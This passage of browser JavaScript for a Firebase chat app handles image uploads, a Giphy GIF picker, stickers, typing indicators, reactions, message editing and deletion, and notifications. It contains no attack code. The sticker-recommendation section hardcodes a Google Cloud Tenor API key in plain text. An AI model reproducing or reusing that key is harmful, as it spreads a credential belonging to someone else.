                        <div class="image-progress-overlay">
                            <div class="circular-progress">
                                <div class="circular-progress-bg"></div>
                                <svg class="circular-progress-svg" viewBox="0 0 60 60">
                                    <circle class="circular-progress-circle" cx="30" cy="30" r="${radius}"
                                        style="stroke-dasharray: ${circumference}; stroke-dashoffset: ${circumference};">
                                    </circle>
                                </svg>
                                <div class="circular-progress-text">0%</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
        messagesContainer.appendChild(tempMessageDiv);
        messagesContainer.scrollTop = messagesContainer.scrollHeight;

        // Upload with progress tracking
        const secureUrl = await uploadImageToCloudinary(file, (progress) => {
            const progressCircle = tempMessageDiv.querySelector('.circular-progress-circle');
            const progressText = tempMessageDiv.querySelector('.circular-progress-text');

            if (progressCircle && progressText) {
                // Calculate stroke-dashoffset for determinate progress
                const offset = circumference - (progress / 100) * circumference;
                progressCircle.style.strokeDashoffset = offset;
                progressText.textContent = `${Math.round(progress)}%`;
            }
        });

        if (secureUrl) {
            // Remove temporary message
            tempMessageDiv.remove();
            // Send actual message
            await sendMediaMessage(secureUrl, 'image');
        }
        imageInput.value = '';
    } catch (error) {
        console.error('Error uploading image:', error);
        // Remove temporary message on error
        const tempMsg = messagesContainer.querySelector(`[data-message-id^="temp-"]`);
        if (tempMsg) tempMsg.remove();
        alert('Failed to upload image. Please check your Cloudinary configuration.');
    }
});

// ===========================
// GIF Picker (Tenor)
// ===========================
function openGifModal() {
    if (!gifModal) {
        console.error('GIF modal element not found');
        return;
    }
    gifModal.classList.remove('hidden');
    gifSearchInput?.focus();

    // Reset pagination when opening modal
    if (!gifInitialLoadDone) {
        gifCurrentOffset = 0;
        gifCurrentQuery = '';
        gifHasMore = true;
        fetchGifResults('', 0, true);
        gifInitialLoadDone = true;
    }
}

function closeGifModal() {
    if (!gifModal) return;
    gifModal.classList.add('hidden');
    if (gifAbortController) {
        gifAbortController.abort();
        gifAbortController = null;
    }
    // Reset pagination when closing
    gifCurrentOffset = 0;
    gifCurrentQuery = '';
    gifHasMore = true;
}

function handleGifScroll() {
    if (!gifResultsEl || gifLoadingMore || !gifHasMore) return;

    const scrollTop = gifResultsEl.scrollTop;
    const scrollHeight = gifResultsEl.scrollHeight;
    const clientHeight = gifResultsEl.clientHeight;

    // Load more when user is within 200px of bottom
    if (scrollHeight - scrollTop - clientHeight < 200) {
        console.log('Loading more GIFs...', 'offset:', gifCurrentOffset);
        fetchGifResults(gifCurrentQuery, gifCurrentOffset, false);
    }
}

function handleGifSearchInput(event) {
    const query = event.target.value.trim();
    if (gifSearchTimeout) {
        clearTimeout(gifSearchTimeout);
    }
    gifSearchTimeout = setTimeout(() => {
        // Reset pagination for new search
        if (query !== gifCurrentQuery) {
            gifCurrentOffset = 0;
            gifCurrentQuery = query;
            gifHasMore = true;
            if (gifResultsEl) {
                gifResultsEl.innerHTML = '';
            }
        }
        fetchGifResults(query, 0, true);
    }, 350);
}

async function fetchGifResults(query = '', offset = 0, reset = false) {
    if (!gifResultsEl) return;

    // Don't load if already loading or no more results
    if (gifLoadingMore || (!gifHasMore && !reset)) return;

    gifLoadingMore = true;

    if (reset) {
        setGifLoading(true);
        gifEmptyState?.classList.add('hidden');
        if (offset === 0) {
            gifResultsEl.innerHTML = '';
        }
    }

    if (gifAbortController) {
        gifAbortController.abort();
    }
    gifAbortController = new AbortController();

    // Use Giphy API
    const params = new URLSearchParams({
        api_key: GIPHY_API_KEY,
        limit: GIPHY_RESULT_LIMIT.toString(),
        rating: 'g', // General audience
        lang: 'en',
        offset: offset.toString()
    });

    let endpoint = 'trending';
    if (query) {
        params.set('q', query);
        endpoint = 'search';
    }

    try {
        const url = `https://api.giphy.com/v1/gifs/${endpoint}?${params.toString()}`;
        console.log('Fetching GIFs from:', url, 'offset:', offset);
        const response = await fetch(url, {
            signal: gifAbortController.signal
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Giphy API error:', response.status, errorText);
            throw new Error(`Giphy API returned ${response.status}: ${errorText}`);
        }

        const data = await response.json();
        console.log('GIF data received:', data);

        if (!data || !data.data) {
            console.warn('Unexpected API response format:', data);
            if (reset) {
                showGifEmptyState('Unexpected response from GIF service. Please try again.');
            }
            return;
        }

        const results = data.data || [];
        const pagination = data.pagination || {};

        // Check if there are more results
        const totalCount = pagination.total_count;
        const currentCount = offset + results.length;

        // If we got a full page of results, assume there might be more
        // If total_count is available, use it; otherwise assume more if we got full results
        if (totalCount !== undefined && totalCount !== null) {
            gifHasMore = currentCount < totalCount && results.length > 0;
        } else {
            // For trending or when total_count is not available, assume more if we got full results
            gifHasMore = results.length >= GIPHY_RESULT_LIMIT;
        }

        // Update offset
        gifCurrentOffset = offset + results.length;

        renderGifResults(results, query, reset);
    } catch (error) {
        if (error.name === 'AbortError') return;
        console.error('Error fetching GIFs:', error);
        if (reset) {
            const errorMessage = error.message || 'Unable to load GIFs right now. Please try again.';
            showGifEmptyState(errorMessage);
        }
    } finally {
        if (reset) {
            setGifLoading(false);
        }
        gifLoadingMore = false;
        gifAbortController = null;
    }
}

function setGifLoading(isLoading) {
    if (!gifLoadingEl) return;
    gifLoadingEl.classList.toggle('hidden', !isLoading);
}

function renderGifResults(results, query, reset = true) {
    if (!gifResultsEl) {
        console.error('GIF results element not found');
        return;
    }

    // Only clear if resetting (new search or initial load)
    if (reset) {
        gifResultsEl.innerHTML = '';
    }

    if (!results || !Array.isArray(results) || results.length === 0) {
        if (reset) {
            showGifEmptyState(query ? 'No GIFs match that vibe. Try a new word.' : 'Nothing trending right now. Try searching!');
        }
        return;
    }

    gifEmptyState?.classList.add('hidden');
    let renderedCount = 0;

    results.forEach((gif) => {
        try {
            // Giphy API format: gif.images.downsized_medium.url (for sending) and gif.images.fixed_height_small.url (for preview)
            const images = gif.images || {};
            const previewUrl = images.fixed_height_small?.url || images.downsized_small?.url || images.preview_gif?.url;
            const sendUrl = images.downsized_medium?.url || images.original?.url || images.fixed_height?.url;

            if (!previewUrl || !sendUrl) {
                console.warn('GIF result missing URLs:', gif);
                return;
            }

            const card = document.createElement('div');
            card.className = 'gif-card';
            const img = document.createElement('img');
            img.src = previewUrl;
            img.alt = gif.title || gif.slug || 'GIF';
            img.loading = 'lazy';
            img.onerror = () => {
                console.warn('Failed to load GIF preview:', previewUrl);
                card.style.display = 'none';
            };
            card.appendChild(img);
            card.addEventListener('click', () => {
                console.log('GIF selected:', sendUrl);
                handleGifSelect(sendUrl);
            });
            gifResultsEl.appendChild(card);
            renderedCount++;
        } catch (error) {
            console.error('Error rendering GIF card:', error, gif);
        }
    });

    if (renderedCount === 0 && reset) {
        showGifEmptyState('Could not load GIF previews. Please try again.');
    } else if (renderedCount > 0) {
        console.log(`Rendered ${renderedCount} GIFs${reset ? '' : ' (appended)'}`);
    }
}

function showGifEmptyState(message) {
    if (!gifEmptyState) return;
    gifEmptyState.textContent = message;
    gifEmptyState.classList.remove('hidden');
}

async function handleGifSelect(url) {
    try {
        await sendMediaMessage(url, 'gif');
        closeGifModal();
    } catch (error) {
        console.error('Error sending GIF:', error);
        alert('Could not send this GIF. Please try a different one.');
    }
}

// ===========================
// Stickers
// ===========================
async function openStickerSheet() {
    if (!stickerSheet) return;

    // Render all sticker sections
    renderDefaultStickers();
    renderAdminStickers();
    renderCustomStickers();

    // Remove hidden class to trigger fade-in animation
    stickerSheet.classList.remove('hidden');
    stickerSheet.classList.remove('closing');
}

function closeStickerSheet() {
    if (!stickerSheet) return;

    // Add closing class for exit animation
    stickerSheet.classList.add('closing');

    // Wait for animation to complete before hiding
    setTimeout(() => {
        stickerSheet.classList.add('hidden');
        stickerSheet.classList.remove('closing');
    }, 250); // Match animation duration
}

function renderDefaultStickers() {
    if (!defaultStickerGrid) return;
    defaultStickerGrid.innerHTML = '';
    DEFAULT_STICKERS.forEach((sticker) => {
        defaultStickerGrid.appendChild(createStickerCard(sticker.url, sticker.emoji));
    });
}

function renderAdminStickers() {
    if (!adminStickerGrid || !adminStickerSection) return;
    adminStickerGrid.innerHTML = '';
    if (!adminStickers.length) {
        adminStickerSection.classList.add('hidden');
        return;
    }
    adminStickerSection.classList.remove('hidden');
    adminStickers.forEach((sticker) => {
        adminStickerGrid.appendChild(createStickerCard(sticker.url, 'Admin sticker'));
    });
}

function renderCustomStickers() {
    if (!customStickerGrid || !customStickerSection) return;
    customStickerGrid.innerHTML = '';
    if (!customStickers.length) {
        customStickerSection.classList.add('hidden');
        return;
    }
    customStickerSection.classList.remove('hidden');
    customStickers.forEach((sticker) => {
        customStickerGrid.appendChild(createStickerCard(sticker.url, 'My sticker'));
    });
}

function createStickerCard(url, label) {
    const card = document.createElement('div');
    card.className = 'sticker-card';
    card.title = label || 'Sticker';
    const img = document.createElement('img');
    img.src = url;
    img.alt = label || 'Sticker';
    card.appendChild(img);
    card.addEventListener('click', () => handleStickerSelect(url));
    return card;
}

async function handleStickerSelect(url) {
    try {
        await sendMediaMessage(url, 'sticker');
        closeStickerSheet();
    } catch (error) {
        console.error('Error sending sticker:', error);
        alert('Could not send this sticker. Please try again.');
    }
}

async function handleStickerUpload(event) {
    const file = event.target.files ? event.target.files[0] : null;
    if (!file || !currentChatId) return;

    try {
        if (addStickerBtn) {
            addStickerBtn.disabled = true;
            addStickerBtn.textContent = 'Uploading…';
        }
        const secureUrl = await uploadImageToCloudinary(file);
        if (secureUrl) {
            customStickers = [{ id: `custom-${Date.now()}`, url: secureUrl }, ...customStickers].slice(0, 40);
            persistCustomStickers();
            renderCustomStickers();
            await sendMediaMessage(secureUrl, 'sticker');
            closeStickerSheet();
        }
    } catch (error) {
        console.error('Error creating sticker:', error);
        alert('Unable to turn that photo into a sticker right now.');
    } finally {
        if (stickerFileInput) {
            stickerFileInput.value = '';
        }
        if (addStickerBtn) {
            addStickerBtn.disabled = false;
            addStickerBtn.textContent = 'Create from photo';
        }
    }
}

function getStickerStorageKey(uid) {
    return `${CUSTOM_STICKERS_KEY_PREFIX}:${uid}`;
}

function loadCustomStickers(uid) {
    if (typeof localStorage === 'undefined') {
        customStickers = [];
        renderCustomStickers();
        return;
    }
    if (!uid) {
        customStickers = [];
        renderCustomStickers();
        return;
    }
    try {
        const stored = localStorage.getItem(getStickerStorageKey(uid));
        customStickers = stored ? JSON.parse(stored) : [];
    } catch (error) {
        console.warn('Could not parse saved stickers', error);
        customStickers = [];
    }
    renderCustomStickers();
}

function persistCustomStickers() {
    if (!currentUser || typeof localStorage === 'undefined') return;
    try {
        localStorage.setItem(getStickerStorageKey(currentUser.uid), JSON.stringify(customStickers));
    } catch (error) {
        console.warn('Could not save stickers locally', error);
    }
}

// Load admin stickers when user is authenticated
async function loadAdminStickers() {
    try {
        const snapshot = await getDocs(collection(db, 'admin_stickers'));
        adminStickers = [];
        snapshot.forEach(doc => {
            adminStickers.push({
                id: doc.id,
                ...doc.data()
            });
        });
        console.log('Loaded admin stickers:', adminStickers.length);
    } catch (error) {
        console.error('Error loading admin stickers:', error);
    }
}

// Load admin backgrounds when user is authenticated
async function loadAdminBackgrounds() {
    try {
        const snapshot = await getDocs(collection(db, 'admin_backgrounds'));
        adminBackgrounds = [];
        snapshot.forEach(doc => {
            adminBackgrounds.push({
                id: doc.id,
                ...doc.data()
            });
        });
        console.log('Loaded admin backgrounds:', adminBackgrounds.length);
    } catch (error) {
        console.error('Error loading admin backgrounds:', error);
    }
}


// ===========================
// Typing Indicator
// ===========================
messageInput.addEventListener('input', () => {
    messageInput.style.height = 'auto';
    messageInput.style.height = Math.min(messageInput.scrollHeight, 150) + 'px';
    updateTypingStatus(true);

    // Smart Sticker Recommendations
    checkStickerKeywords(messageInput.value);

    clearTimeout(typingTimeout);
    typingTimeout = setTimeout(() => {
        updateTypingStatus(false);
    }, 2000);
});

async function updateTypingStatus(isTyping) {
    if (!currentChatId) return;

    try {
        const typingRef = doc(db, 'chats', currentChatId, 'typing', currentUser.uid);
        if (isTyping) {
            await setDoc(typingRef, { typing: true, timestamp: serverTimestamp() });
        } else {
            await deleteDoc(typingRef);
        }
    } catch (error) {
        console.error('Error updating typing status:', error);
    }
}

function listenForTyping() {
    if (unsubscribeTyping) {
        unsubscribeTyping();
    }

    const typingRef = doc(db, 'chats', currentChatId, 'typing', currentChatUser.uid);
    unsubscribeTyping = onSnapshot(typingRef, (docSnap) => {
        const isTyping = docSnap.exists() && docSnap.data().typing;
        const existingIndicator = messagesContainer.querySelector('.message.typing-indicator-message');

        if (isTyping) {
            // Only add if it doesn't exist
            if (!existingIndicator) {
                const div = document.createElement('div');
                div.className = 'message received typing-indicator-message';
                div.innerHTML = `
                    <div class="message-bubble typing">
                        <div class="typing-dots">
                            <span></span>
                            <span></span>
                            <span></span>
                        </div>
                    </div>
                `;
                messagesContainer.appendChild(div);
                scrollToBottom(true);
            }
        } else {
            // Only remove if it exists
            if (existingIndicator) {
                // Add fade-out animation before removal
                existingIndicator.style.opacity = '0';
                existingIndicator.style.marginBottom = '0';
                // Remove after animation completes (200ms)
                setTimeout(() => {
                    if (existingIndicator.parentNode) {
                        existingIndicator.remove();
                    }
                }, 200);
            }
        }
    });
}

// ===========================
// Mark Messages as Seen
// ===========================
let markSeenTimeout = null;

async function markMessagesAsSeen() {
    if (!currentChatId || !currentChatUser || !messagesContainer) return;

    // Debounce to prevent excessive calls
    if (markSeenTimeout) {
        clearTimeout(markSeenTimeout);
    }

    markSeenTimeout = setTimeout(async () => {
        try {
            // Check if user is at the bottom of the message list (viewing recent messages)
            const isAtBottom = messagesContainer.scrollHeight - messagesContainer.scrollTop <= messagesContainer.clientHeight + 100;

            // Only mark messages as seen if user is at the bottom (viewing recent messages)
            if (!isAtBottom) return;

            const messagesRef = collection(db, 'chats', currentChatId, 'messages');
            const q = query(messagesRef, where('senderId', '==', currentChatUser.uid), where('seen', '==', false));
            const snapshot = await getDocs(q);

            // Batch update all unseen messages
            const updatePromises = [];
            snapshot.forEach((docSnap) => {
                updatePromises.push(updateDoc(docSnap.ref, { seen: true }));
            });

            await Promise.all(updatePromises);
        } catch (error) {
            console.error('Error marking messages as seen:', error);
        }
    }, 500); // Wait 500ms before marking as seen
}

// ===========================
// Reply Functions
// ===========================
function setReplyTo(messageData) {
    replyingToMessage = messageData;
    replyPreview.classList.remove('hidden');

    const replyToName = document.querySelector('.reply-to-name');
    const replyPreviewText = document.querySelector('.reply-preview-text');

    const senderName = messageData.senderName || 'Unknown';
    replyToName.textContent = `Replying to ${senderName}`;
    replyPreviewText.textContent = getMessagePreviewText(messageData);

    messageInput.focus();
}

function cancelReply() {
    replyingToMessage = null;
    replyPreview.classList.add('hidden');
}

// Edit message functions
function setEditMessage(messageId, messageText) {
    editingMessageId = messageId;
    editingOriginalText = messageText;

    // Cancel any active reply
    cancelReply();

    // Set input value and update preview
    messageInput.value = messageText;
    messageInput.focus();

    // Update reply preview to show "Editing message"
    replyPreview.classList.remove('hidden');
    const replyToName = document.querySelector('.reply-to-name');
    const replyPreviewText = document.querySelector('.reply-preview-text');
    replyToName.textContent = 'Editing message';
    replyPreviewText.textContent = messageText;
}

function cancelEdit() {
    editingMessageId = null;
    editingOriginalText = null;
    replyPreview.classList.add('hidden');
    messageInput.value = '';
}

// Update cancel button to handle both reply and edit
cancelReplyBtn.removeEventListener('click', cancelReply);
cancelReplyBtn.addEventListener('click', () => {
    if (editingMessageId) {
        cancelEdit();
    } else {
        cancelReply();
    }
});

// Swipe to reply handler
async function triggerSwipeReply(messageData) {
    // Get sender name
    let senderName = 'Unknown';
    if (messageData.senderId === currentUser.uid) {
        const currentUserDoc = await getDoc(doc(db, 'users', currentUser.uid));
        senderName = currentUserDoc.data()?.displayName || 'You';
    } else if (currentChatUser) {
        senderName = currentChatUser.displayName;
    }

    setReplyTo({
        id: messageData.id,
        senderId: messageData.senderId,
        senderName: senderName,
        text: messageData.text,
        type: messageData.type,
        imgUrl: messageData.imgUrl || null
    });
}

cancelReplyBtn.addEventListener('click', cancelReply);

// ===========================
// Reactions
// ===========================
function showReactionPopup(event, messageId) {
    selectedMessageId = messageId;

    // Reparent the popup to the message element
    const messageEl = document.querySelector(`.message[data-message-id="${messageId}"]`);
    if (messageEl) {
        // Reset z-index for all other messages first
        document.querySelectorAll('.message').forEach(m => m.style.zIndex = '');

        // Boost z-index of current message
        messageEl.style.zIndex = '100';
        messageEl.appendChild(reactionPopup);
    }

    reactionPopup.classList.remove('hidden');

    const x = event.clientX || (event.touches && event.touches[0] ? event.touches[0].clientX : 0);
    const y = event.clientY || (event.touches && event.touches[0] ? event.touches[0].clientY : 0);

    // Get popup dimensions
    const popupWidth = 300; // approximate width
    const popupHeight = 60;

    // Calculate position relative to the MESSAGE element
    const messageRect = messageEl.getBoundingClientRect();

    // Initial position: centered above the touch point, relative to message
    let left = x - messageRect.left - (popupWidth / 2);
    let top = y - messageRect.top - popupHeight - 10;

    // Smart positioning logic relative to VIEWPORT to prevent clipping
    // But applying it to the relative coordinates

    // Horizontal boundary check (viewport)
    if (x - (popupWidth / 2) < 10) {
        // Too far left
        left = 10 - messageRect.left;
    } else if (x + (popupWidth / 2) > window.innerWidth - 10) {
        // Too far right
        left = (window.innerWidth - 10 - popupWidth) - messageRect.left;
    }

    // Vertical boundary check (viewport)
    if (y - popupHeight - 10 < 10) {
        // Too close to top, show below
        top = y - messageRect.top + 20;
    }

    reactionPopup.style.left = `${left}px`;
    reactionPopup.style.top = `${top}px`;
}

document.querySelectorAll('.reaction-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        const emoji = btn.dataset.emoji;
        if (!selectedMessageId || !currentChatId) return;

        try {
            const messageRef = doc(db, 'chats', currentChatId, 'messages', selectedMessageId);
            const messageDoc = await getDoc(messageRef);

            if (messageDoc.exists()) {
                let reactions = messageDoc.data().reactions || [];

                // Find if user already reacted
                const existingReactionIndex = reactions.findIndex(r => r.userId === currentUser.uid);

                if (existingReactionIndex !== -1) {
                    // User already reacted
                    if (reactions[existingReactionIndex].emoji === emoji) {
                        // Same emoji: Remove reaction (toggle off)
                        reactions.splice(existingReactionIndex, 1);
                    } else {
                        // Different emoji: Update reaction
                        reactions[existingReactionIndex].emoji = emoji;
                    }
                } else {
                    // New reaction
                    reactions.push({ emoji, userId: currentUser.uid });
                }

                await updateDoc(messageRef, { reactions });
            }

            reactionPopup.classList.add('hidden');

            // Reset z-index for all messages
            document.querySelectorAll('.message').forEach(m => m.style.zIndex = '');

        } catch (error) {
            console.error('Error adding reaction:', error);
        }
    });
});

// Hide reaction popup when clicking outside
// Hide reaction popup when clicking outside
document.addEventListener('click', (e) => {
    let shouldResetZIndex = false;

    if (!reactionPopup.contains(e.target) && !e.target.closest('.message-bubble')) {
        if (!reactionPopup.classList.contains('hidden')) {
            reactionPopup.classList.add('hidden');
            shouldResetZIndex = true;
        }
    }
    if (!messageOptions.contains(e.target) && !e.target.closest('.message-options-trigger')) {
        if (!messageOptions.classList.contains('hidden')) {
            messageOptions.classList.add('hidden');
            isContextMenuOpen = false;
            shouldResetZIndex = true;
        }
    }

    if (shouldResetZIndex) {
        document.querySelectorAll('.message').forEach(m => m.style.zIndex = '');
    }
});

// Also handle touch events outside to close menu and remove blur listener
document.addEventListener('touchstart', (e) => {
    // If menu is open and touch is outside menu and input
    if (isContextMenuOpen && !messageOptions.contains(e.target) && !e.target.closest('.message-options-trigger') && e.target !== messageInput) {
        messageOptions.classList.add('hidden');
        isContextMenuOpen = false;
        // Remove blur listener when menu closes
        if (isMobileDevice()) {
            messageInput.removeEventListener('blur', preventBlurWhileMenuOpen);
        }
    }
}, true);


// ===========================
// Smart Sticker Recommendations (Tenor API)
// ===========================
const TENOR_API_KEY = 'AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ'; // Google Cloud Tenor API Key
const TENOR_CLIENT_KEY = 'sticker_recommendations';
let stickerRecommendationTimeout = null;
let lastStickerQuery = '';

function checkStickerKeywords(text) {
    if (!text || text.length < 2) {
        hideStickerRecommendations();
        return;
    }

    // Get the last word being typed
    const words = text.trim().split(/\s+/);
    if (!words.length) return;

    const lastWord = words[words.length - 1].toLowerCase().replace(/[^a-z]/g, '');

    // Minimum 2 characters to trigger, max 10 characters
    if (lastWord.length < 2 || lastWord.length > 10) {
        hideStickerRecommendations();
        return;
    }

    // Debounce API calls
    if (stickerRecommendationTimeout) {
        clearTimeout(stickerRecommendationTimeout);
    }

    // Skip if same query
    if (lastWord === lastStickerQuery) return;

    stickerRecommendationTimeout = setTimeout(() => {
        fetchTenorStickers(lastWord);
    }, 1500);
}

async function fetchTenorStickers(query) {
    if (!query || query.length < 2 || query.length > 10) return;

    lastStickerQuery = query;

    try {
        const params = new URLSearchParams({
            key: TENOR_API_KEY,
            client_key: TENOR_CLIENT_KEY,
            q: query,
            limit: '20',
            media_filter: 'tinygif,gif'
        });

        const response = await fetch(`https://tenor.googleapis.com/v2/search?${params.toString()}`);

        if (!response.ok) {
            console.warn('Tenor API error:', response.status);
            return;
        }

        const data = await response.json();

        if (!data.results || data.results.length === 0) {
            hideStickerRecommendations();
            return;
        }

        const stickers = data.results.map((result, index) => ({
            id: result.id || `tenor-${index}`,
            url: result.media_formats?.tinygif?.url || result.media_formats?.gif?.url,
            sendUrl: result.media_formats?.gif?.url || result.media_formats?.tinygif?.url,
            alt: result.content_description || query
        })).filter(s => s.url);

        if (stickers.length > 0) {
            renderStickerRecommendations(stickers);
        } else {
            hideStickerRecommendations();
        }
    } catch (error) {
        console.error('Error fetching Tenor stickers:', error);
        hideStickerRecommendations();
    }
}

function renderStickerRecommendations(stickers) {
    const container = document.getElementById('sticker-recommendation-container');
    if (!container) return;

    container.innerHTML = '';
    stickers.forEach(sticker => {
        const div = document.createElement('div');
        div.className = 'recommended-sticker';
        const img = document.createElement('img');
        img.src = sticker.url;
        img.alt = sticker.alt || 'Sticker';
        img.loading = 'lazy';
        div.appendChild(img);

        div.addEventListener('click', () => {
            console.log('Sending recommended sticker:', sticker.sendUrl);
            handleStickerSelect(sticker.sendUrl);
            hideStickerRecommendations();
            lastStickerQuery = '';
        });

        container.appendChild(div);
    });

    container.classList.remove('hidden');
}

function hideStickerRecommendations() {
    // Cancel any pending fetch
    if (stickerRecommendationTimeout) {
        clearTimeout(stickerRecommendationTimeout);
        stickerRecommendationTimeout = null;
    }
    const container = document.getElementById('sticker-recommendation-container');
    if (container) {
        container.classList.add('hidden');
        container.innerHTML = '';
    }
    lastStickerQuery = '';
}



// ===========================
// Message Options (Edit/Delete/Reply)
// ===========================
async function showMessageOptions(event, messageId) {
    selectedMessageId = messageId;

    // Get message element and data
    const messageEl = document.querySelector(`.message[data-message-id="${messageId}"]`);
    const isOwnMessage = messageEl && messageEl.classList.contains('sent');
    const isMediaMessage = messageEl && messageEl.classList.contains('no-bubble');

    // Get message type from data attribute to avoid network delay
    let messageType = 'text';
    if (messageEl) {
        messageType = messageEl.dataset.messageType || 'text';
    }

    // Get all option buttons
    const copyBtn = document.querySelector('.option-btn[data-action="copy"]');
    const replyBtn = document.querySelector('.option-btn[data-action="reply"]');
    const editBtn = document.querySelector('.option-btn[data-action="edit"]');
    const deleteBtn = document.querySelector('.option-btn[data-action="delete"]');

    // Configure visibility based on message type
    if (copyBtn) {
        // Copy only available for text messages
        copyBtn.style.display = (messageType === 'text') ? 'block' : 'none';
    }

    if (replyBtn) {
        // Reply not available for own messages
        replyBtn.style.display = isOwnMessage ? 'none' : 'block';
    }

    if (editBtn) {
        // Edit only available for own text messages
        editBtn.style.display = (isOwnMessage && messageType === 'text') ? 'block' : 'none';
    }

    if (deleteBtn) {
        // Delete available for all own messages
        deleteBtn.style.display = isOwnMessage ? 'block' : 'none';
    }

    // Reparent the menu to the message element so it scrolls with it
    if (messageEl) {
        // Reset z-index for all other messages first
        document.querySelectorAll('.message').forEach(m => m.style.zIndex = '');

        // Boost z-index of current message
        messageEl.style.zIndex = '100';
        messageEl.appendChild(messageOptions);
    }

    messageOptions.classList.remove('hidden');
    isContextMenuOpen = true;

    // Determine viewport dimensions (use visualViewport if available for keyboard awareness)
    const viewportWidth = window.visualViewport ? window.visualViewport.width : window.innerWidth;
    const viewportHeight = window.visualViewport ? window.visualViewport.height : window.innerHeight;
    const viewportLeft = window.visualViewport ? window.visualViewport.offsetLeft : 0;
    const viewportTop = window.visualViewport ? window.visualViewport.offsetTop : 0;

    // Get menu dimensions
    const menuWidth = 140;
    const menuHeight = 160;
    const padding = 12;

    // Calculate position relative to the MESSAGE element (since it's now absolute positioned inside relative parent)
    // We need to convert the touch/click coordinates (viewport relative) to message-relative coordinates
    const messageRect = messageEl.getBoundingClientRect();

    // Initial position: near the click/touch point, but relative to message
    // event.clientX is viewport x, messageRect.left is viewport x of message
    let left = (event.clientX || event.pageX || 0) - messageRect.left;
    let top = (event.clientY || event.pageY || 0) - messageRect.top;

    // Smart positioning logic relative to VIEWPORT to prevent clipping
    // But applying it to the relative coordinates

    const clickX = event.clientX || event.pageX || 0;
    const clickY = event.clientY || event.pageY || 0;

    // Horizontal boundary check (viewport)
    if (clickX + menuWidth > viewportLeft + viewportWidth - padding) {
        // Go left
        left -= menuWidth;
    }

    // Vertical boundary check (viewport)
    if (clickY + menuHeight > viewportTop + viewportHeight - padding) {
        // Go up
        top -= menuHeight;
    }

    messageOptions.style.left = `${left}px`;
    messageOptions.style.top = `${top}px`;
}

document.querySelectorAll('.option-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        const action = btn.dataset.action;
        if (!selectedMessageId || !currentChatId) return;

        const messageRef = doc(db, 'chats', currentChatId, 'messages', selectedMessageId);

        try {
            if (action === 'copy') {
                // Copy text message to clipboard
                const messageDoc = await getDoc(messageRef);
                if (messageDoc.exists()) {
                    const messageData = messageDoc.data();
                    const textToCopy = messageData.text || '';
                    if (textToCopy) {
                        await navigator.clipboard.writeText(textToCopy);
                        // Show visual feedback
                        const copyBtn = document.querySelector('.option-btn[data-action="copy"]');
                        if (copyBtn) {
                            const originalText = copyBtn.textContent;
                            copyBtn.textContent = 'Copied!';
                            setTimeout(() => {
                                copyBtn.textContent = originalText;
                            }, 1500);
                        }
                    }
                }
            } else if (action === 'reply') {
                // Get message data for reply
                const messageDoc = await getDoc(messageRef);
                if (messageDoc.exists()) {
                    const messageData = messageDoc.data();
                    // Get sender name
                    let senderName = 'Unknown';
                    if (messageData.senderId === currentUser.uid) {
                        const currentUserDoc = await getDoc(doc(db, 'users', currentUser.uid));
                        senderName = currentUserDoc.data()?.displayName || 'You';
                    } else if (currentChatUser) {
                        senderName = currentChatUser.displayName;
                    }

                    setReplyTo({
                        id: selectedMessageId,
                        senderId: messageData.senderId,
                        senderName: senderName,
                        text: messageData.text,
                        type: messageData.type,
                        imgUrl: messageData.imgUrl || null
                    });
                }
            } else if (action === 'delete') {
                // Get message data to check if it's a voice/media message
                const messageDoc = await getDoc(messageRef);
                const messageData = messageDoc.data();

                // Delete from Cloudinary if it's a voice or media message
                if (messageData && (messageData.voiceUrl || messageData.imgUrl)) {
                    try {
                        await deleteMediaFromCloudinary(messageData.voiceUrl || messageData.imgUrl);
                    } catch (error) {
                        console.error('Error deleting from Cloudinary:', error);
                        // Continue with message deletion even if Cloudinary deletion fails
                    }
                }

                // Delete playback instance if it exists
                if (messageData && messageData.type === 'voice') {
                    const playerData = voicePlayersMap.get(messageData.id);
                    if (playerData && playerData.audio) {
                        playerData.audio.pause();
                        playerData.audio.src = '';
                    }
                    voicePlayersMap.delete(messageData.id);
                }

                // Mark message as deleted in Firestore
                await updateDoc(messageRef, {
                    text: '',
                    imgUrl: '',
                    voiceUrl: '',
                    type: 'text',
                    reactions: [],
                    replyTo: null,
                    isEdited: false,
                    isDeleted: true,
                    deletedAt: serverTimestamp()
                });
            } else if (action === 'edit') {
                const messageDoc = await getDoc(messageRef);
                if (messageDoc.exists() && messageDoc.data().senderId === currentUser.uid) {
                    setEditMessage(selectedMessageId, messageDoc.data().text);
                }
            }

            messageOptions.classList.add('hidden');
            isContextMenuOpen = false;
            // Remove blur listener when menu closes
            if (isMobileDevice()) {
                messageInput.removeEventListener('blur', preventBlurWhileMenuOpen);
            }
        } catch (error) {
            console.error('Error performing message action:', error);
        }
    });
});

// ===========================
// Notification System
// ===========================

function initializeNotificationSystem() {
    if (!currentUser) return;

    // Listen for real-time notifications
    listenForNotifications();

    // Set up notification button listeners
    notificationsBtn.addEventListener('click', openNotificationsModal);
    closeNotificationsBtn.addEventListener('click', closeNotificationsModal);
    notificationsBackdrop.addEventListener('click', closeNotificationsModal);
}

function listenForNotifications() {
    if (unsubscribeNotifications) {
        unsubscribeNotifications();
    }

    try {
        const notificationsRef = collection(db, 'notifications');
        // Query without orderBy to avoid index requirement
        const q = query(
            notificationsRef,
            where('recipientId', '==', currentUser.uid)
        );

        unsubscribeNotifications = onSnapshot(q, (snapshot) => {
            userNotifications = [];
            notificationsUnreadCount = 0;
            const now = new Date();
            const NOTIFICATION_EXPIRY_MS = 24 * 60 * 60 * 1000; // 24 hours

            snapshot.forEach((doc) => {
                const notification = {
                    id: doc.id,
                    ...doc.data()
                };

                // Check if notification has expired
                let notificationTime;
                if (notification.timestamp?.toDate) {
                    notificationTime = notification.timestamp.toDate();
                } else if (notification.timestamp instanceof Date) {
                    notificationTime = notification.timestamp;
                } else if (typeof notification.timestamp === 'number') {
                    notificationTime = new Date(notification.timestamp);
                } else {
                    notificationTime = new Date();
                }

                const timeDifference = now - notificationTime;

                // If notification is older than 24 hours, delete it
                if (timeDifference > NOTIFICATION_EXPIRY_MS) {
                    console.log('Deleting expired notification:', notification.id);
                    deleteDoc(doc.ref).catch(error => {
                        console.error('Error deleting expired notification:', error);
                    });
                } else {
                    // Only add non-expired notifications
                    userNotifications.push(notification);
                    if (!notification.read) {
                        notificationsUnreadCount++;
                    }
                }
            });

